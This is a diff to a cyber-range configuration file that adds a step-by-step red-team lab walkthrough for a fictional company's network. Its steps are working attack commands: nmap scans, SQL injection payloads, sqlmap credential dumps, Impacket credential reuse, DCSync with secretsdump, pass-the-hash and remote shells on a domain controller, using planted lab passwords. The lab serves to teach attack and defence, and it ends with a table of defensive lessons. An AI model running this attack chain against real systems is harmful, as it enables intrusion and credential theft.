@@ -110,6 +110,524 @@ router:
   enabled: true
   dhcp_enabled: false
 
+# MSEL Configuration with Student Walkthrough
+msel:
+  format: yaml
+  walkthrough:
+    title: "Red Team Training Lab"
+    phases:
+      # ============================================
+      # PHASE 1: RECONNAISSANCE
+      # ============================================
+      - id: phase1
+        name: "Reconnaissance"
+        steps:
+          - id: step1_1
+            title: "Understanding Your Position"
+            vm: kali
+            content: |
+              ## Your Mission
+
+              You are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.
+
+              ### Network Architecture
+
+              ```
+              INTERNET (172.16.0.0/24)
+              ├── kali (172.16.0.10)        ← You are here
+              └── wordpress (172.16.0.100)  ← Your initial target
+
+              DMZ (172.16.1.0/24)
+              └── wordpress (172.16.1.10)   ← Same server, internal IP
+
+              INTERNAL (172.16.2.0/24)
+              ├── fileserver (172.16.2.10)  ← SMB File Server
+              ├── ws01 (172.16.2.11)        ← Employee Workstation
+              └── dc01 (172.16.2.12)        ← Domain Controller
+              ```
+
+              ### First Steps
+
+              Open a terminal and check your IP address:
+
+              ```bash
+              ip addr show eth0
+              ```
+
+              > You should see `172.16.0.10` - you're on the "internet" network.
+
+          - id: step1_2
+            title: "Network Discovery"
+            vm: kali
+            content: |
+              ## Discover Live Hosts
+
+              Let's find what hosts are reachable from our position.
+
+              ```bash
+              # Ping sweep - find live hosts
+              nmap -sn 172.16.0.0/24
+              ```
+
+              **What `-sn` does:** Host discovery only, no port scan. Fast and stealthy.
+
+              ### Expected Results
+
+              You should find:
+              - `172.16.0.1` - Gateway
+              - `172.16.0.10` - Your Kali box
+              - `172.16.0.100` - **WordPress server** (your target!)
+
+          - id: step1_3
+            title: "Service Enumeration"
+            vm: kali
+            content: |
+              ## Enumerate the Target
+
+              Now scan the WordPress server for open ports and services:
+
+              ```bash
+              nmap -sV -sC 172.16.0.100
+              ```
+
+              **Flags explained:**
+              - `-sV` - Detect service versions
+              - `-sC` - Run default NSE scripts
+
+              ### Expected Results
+
+              | Port | Service | Notes |
+              |------|---------|-------|
+              | 80 | HTTP | Apache web server |
+              | 3306 | MySQL | Database (may be filtered) |
+
+              > **Next:** Let's explore that web application!
+
+      # ============================================
+      # PHASE 2: WEB APPLICATION ATTACK
+      # ============================================
+      - id: phase2
+        name: "SQL Injection"
+        steps:
+          - id: step2_1
+            title: "Explore the Web App"
+            vm: kali
+            content: |
+              ## Web Application Reconnaissance
+
+              Open Firefox and browse to the target:
+
+              ```
+              http://172.16.0.100
+              ```
+
+              Or use curl:
+              ```bash
+              curl -s http://172.16.0.100 | head -50
+              ```
+
+              ### What to Look For
+
+              - Technology stack (WordPress, custom app?)
+              - Login forms and search boxes
+              - Links to other pages
+
+              > **Hint:** Look for an **Employee Directory** page!
+
+          - id: step2_2
+            title: "Find the Vulnerable Page"
+            vm: kali
+            content: |
+              ## Directory Discovery
+
+              Let's find hidden pages:
+
+              ```bash
+              gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
+              ```
+
+              Or navigate directly to:
+              ```
+              http://172.16.0.100/?page_id=4
+              ```
+
+              ### The Employee Directory
+
+              This page has a **search box** - user input fields are always interesting for attackers!
+
+              Try searching for: `IT`
+
+          - id: step2_3
+            title: "Test for SQL Injection"
+            vm: kali
+            content: |
+              ## Testing the Search Box
+
+              Let's test if the search is vulnerable to SQL injection.
+
+              ### The Classic Single Quote Test
+
+              ```bash
+              curl "http://172.16.0.100/employee-directory/?search='"
+              ```
+
+              If you see an error or unexpected behavior, the input isn't sanitized!
+
+              ### Boolean-Based Test
+
+              ```bash
+              # This should return ALL results (always true)
+              curl "http://172.16.0.100/employee-directory/?search=' OR '1'='1"
+
+              # This should return NOTHING (always false)
+              curl "http://172.16.0.100/employee-directory/?search=' AND '1'='2"
+              ```
+
+              > **If both behave differently, you've confirmed SQL injection!**
+
+          - id: step2_4
+            title: "Extract Data with SQLMap"
+            vm: kali
+            content: |
+              ## Automated Exploitation
+
+              SQLMap automates SQL injection attacks. Let's use it!
+
+              ### Step 1: Confirm the Vulnerability
+
+              ```bash
+              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --batch
+              ```
+
+              `--batch` accepts all default prompts automatically.
+
+              ### Step 2: List Databases
+
+              ```bash
+              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --dbs --batch
+              ```
+
+              ### Step 3: List Tables
+
+              ```bash
+              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --tables --batch
+              ```
+
+              > Look for: `wp_acme_employees`
+
+          - id: step2_5
+            title: "Dump the Credentials!"
+            vm: kali
+            content: |
+              ## Extract Employee Data
+
+              Now dump the employee table:
+
+              ```bash
+              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
+                -D wordpress -T wp_acme_employees --dump --batch
+              ```
+
+              ### 🎯 CRITICAL FINDING
+
+              The output reveals **VPN credentials in plaintext**:
+
+              | Employee | Username | Password |
+              |----------|----------|----------|
+              | John Smith | jsmith | Summer2024 |
+              | Mary Williams | mwilliams | Welcome123 |
+              | **Backup Service** | **svc_backup** | **Backup2024!** |
+
+              > **The service account is your ticket to the internal network!**
+
+      # ============================================
+      # PHASE 3: LATERAL MOVEMENT
+      # ============================================
+      - id: phase3
+        name: "Lateral Movement"
+        steps:
+          - id: step3_1
+            title: "Test Credential Reuse"
+            vm: kali
+            content: |
+              ## The Credential Reuse Attack
+
+              Employees often reuse passwords. Let's test if `svc_backup` works on the internal file server.
+
+              We'll use **Impacket** - a powerful collection of Python tools for network protocols.
+
+              ### Connect to the File Server
+
+              ```bash
+              impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+              ```
+
+              ### If Connected, List Shares
+
+              ```
+              # shares
+              ```
+
+              ### Expected Shares
+
+              | Share | Description |
+              |-------|-------------|
+              | public | Open to everyone |
+              | **sensitive** | Restricted - but svc_backup has access! |
+
+          - id: step3_2
+            title: "Access Sensitive Files"
+            vm: kali
+            content: |
+              ## Explore the Sensitive Share
+
+              Once connected with impacket-smbclient:
+
+              ```
+              # use sensitive
+              # ls
+              # cat passwords.txt
+              ```
+
+              ### Impacket Commands Reference
+
+              | Command | Description |
+              |---------|-------------|
+              | `shares` | List available shares |
+              | `use <share>` | Connect to a share |
+              | `ls` | List files |
+              | `cat <file>` | Display file contents |
+              | `get <file>` | Download file |
+              | `exit` | Disconnect |
+
+              ### Alternative One-Liner
+
+              ```bash
+              echo -e 'use sensitive\ncat passwords.txt\nexit' | \
+                impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+              ```
+
+          - id: step3_3
+            title: "🎯 The Domain Admin Password"
+            vm: kali
+            content: |
+              ## Critical Discovery!
+
+              The `passwords.txt` file contains:
+
+              ```
+              =====================================
+              ACME Widgets Emergency Credentials
+              =====================================
+
+              Domain Admin (emergency): Adm1n2024!
+
+              DO NOT SHARE - IT DEPT ONLY
+              =====================================
+              ```
+
+              ### What You've Found
+
+              | Account | Password | Access Level |
+              |---------|----------|--------------|
+              | Administrator | Adm1n2024! | **DOMAIN ADMIN** |
+
+              > **You now have the keys to the kingdom!**
+
+              But let's also explore another attack path...
+
+      # ============================================
+      # PHASE 4: DOMAIN COMPROMISE
+      # ============================================
+      - id: phase4
+        name: "Domain Compromise"
+        steps:
+          - id: step4_1
+            title: "Understanding DCSync"
+            vm: kali
+            content: |
+              ## The DCSync Attack
+
+              Remember `svc_backup`? This account has **"Replicating Directory Changes"** permissions - a common misconfiguration for backup service accounts.
+
+              ### What is DCSync?
+
+              DCSync abuses the domain replication protocol. Your computer pretends to be a Domain Controller and requests password hashes from the real DC.
+
+              ### Why This Works
+
+              - Domain Controllers replicate data between each other
+              - Any account with replication rights can request this data
+              - The data includes **all user password hashes**!
+
+          - id: step4_2
+            title: "Perform DCSync"
+            vm: kali
+            content: |
+              ## Extract Domain Hashes
+
+              Use Impacket's secretsdump to perform DCSync:
+
+              ```bash
+              impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
+              ```
+
+              ### ⚠️ Note About This Lab
+
+              This lab uses **Samba 4** (not Windows AD), which has limited DCSync support. If you see `rpc_s_access_denied`, don't worry!
+
+              **Alternative:** Use the Domain Admin password you found in `passwords.txt`:
+
+              ```bash
+              impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'
+              ```
+
+              ### Understanding the Output
+
+              ```
+              Administrator:500:aad3b435...:NTLM_HASH:::
+              ```
+
+              Format: `username:RID:LM_hash:NTLM_hash:::`
+
+          - id: step4_3
+            title: "Pass-the-Hash Attack"
+            vm: kali
+            content: |
+              ## Using Hashes Without Cracking
+
+              You don't need the plaintext password - the hash works directly!
+
+              ### Pass-the-Hash with Impacket
+
+              ```bash
+              # Replace <NTLM_HASH> with the actual hash
+              impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
+                Administrator@172.16.2.12
+              ```
+
+              ### Or Just Use the Password
+
+              Since we have the plaintext:
+
+              ```bash
+              impacket-psexec 'Administrator:Adm1n2024!@172.16.2.12'
+              ```
+
+              ### Other Impacket Execution Methods
+
+              | Tool | Protocol | Stealth |
+              |------|----------|---------|
+              | psexec | SMB | Low (creates service) |
+              | wmiexec | WMI | Medium |
+              | atexec | Task Scheduler | High |
+              | smbexec | SMB | Medium |
+
+      # ============================================
+      # PHASE 5: POST-EXPLOITATION
+      # ============================================
+      - id: phase5
+        name: "Post-Exploitation"
+        steps:
+          - id: step5_1
+            title: "Verify Domain Admin Access"
+            vm: kali
+            content: |
+              ## Confirm Your Access
+
+              Let's verify we have Domain Admin on all systems.
+
+              ### Domain Controller
+
+              ```bash
+              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+              ```
+
+              ### File Server
+
+              ```bash
+              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.10'
+              ```
+
+              ### Get a Shell on the DC
+
+              ```bash
+              impacket-wmiexec 'Administrator:Adm1n2024!@172.16.2.12'
+              ```
+
+              Then run:
+              ```
+              whoami
+              whoami /groups
+              ```
+
+          - id: step5_2
+            title: "Explore the Domain"
+            vm: kali
+            content: |
+              ## Domain Enumeration
+
+              From your shell on the DC, explore the domain:
+
+              ```bash
+              # List all domain users
+              net user /domain
+
+              # List Domain Admins
+              net group "Domain Admins" /domain
+
+              # List all computers
+              net group "Domain Computers" /domain
+              ```
+
+              ### Additional Recon with Impacket
+
+              ```bash
+              # Remote registry access
+              impacket-reg 'Administrator:Adm1n2024!@172.16.2.12' query -keyName HKLM\\SOFTWARE
+              ```
+
+          - id: step5_3
+            title: "🏆 Mission Complete!"
+            vm: kali
+            content: |
+              ## Attack Chain Summary
+
+              Congratulations! Here's your complete attack path:
+
+              ```
+              1. RECONNAISSANCE
+                 └── nmap discovered WordPress at 172.16.0.100
+
+              2. SQL INJECTION
+                 └── Employee Directory vulnerable
+                     └── Extracted credentials:
+                         - svc_backup / Backup2024!
+
+              3. LATERAL MOVEMENT
+                 └── Credential reuse on file server
+                     └── Found passwords.txt
+                         └── Domain Admin: Adm1n2024!
+
+              4. DOMAIN COMPROMISE
+                 └── Full admin access to:
+                     - dc01 (Domain Controller)
+                     - fileserver
+                     - All domain resources
+              ```
+
+              ## Defensive Lessons
+
+              | Vulnerability | Fix |
+              |--------------|-----|
+              | SQL Injection | Parameterized queries |
+              | Plaintext passwords | Use a secrets manager |
+              | Password reuse | Unique passwords + MFA |
+              | Sensitive files on share | Proper access controls |
+              | Excessive service account rights | Least privilege |
+
+              > **Remember:** Only use these techniques with explicit authorization!
+
 # Training scenario events (MSEL)
 events:
   - sequence: 1
